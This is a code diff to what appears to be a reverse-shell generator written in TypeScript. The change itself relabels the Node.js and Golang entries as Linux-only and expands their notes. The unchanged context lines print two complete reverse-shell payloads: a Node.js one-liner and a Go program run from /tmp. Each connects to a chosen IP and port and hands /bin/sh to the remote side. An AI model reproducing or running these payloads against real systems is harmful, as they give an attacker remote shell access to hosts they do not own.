@@ -217,9 +217,9 @@ export const SHELLS: ShellVariant[] = [
     id: "nodejs",
     label: "Node.js",
     group: "Node.js",
-    os: "cross",
+    os: "linux",
     usesShellPath: false,
-    note: "Requires node on the target — uncommon outside dev boxes or Node-based app containers.",
+    note: "Requires node on the target — uncommon outside dev boxes or Node-based app containers. Spawns /bin/sh, so this targets Unix hosts only, not Windows.",
     render: (p) =>
       `node -e '(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var client=new net.Socket();client.connect(${p.port},"${p.ip}",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();'`,
     file: {
@@ -248,9 +248,9 @@ export const SHELLS: ShellVariant[] = [
     id: "golang",
     label: "Golang (go run)",
     group: "Golang",
-    os: "cross",
+    os: "linux",
     usesShellPath: false,
-    note: "Needs the full Go toolchain installed on the target, not just a compiled binary — uncommon outside dev/CI hosts.",
+    note: "Needs the full Go toolchain installed on the target, not just a compiled binary — uncommon outside dev/CI hosts. Runs /bin/sh, so this targets Unix hosts only, not Windows.",
     render: (p) =>
       `echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","${p.ip}:${p.port}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go`,
     file: {
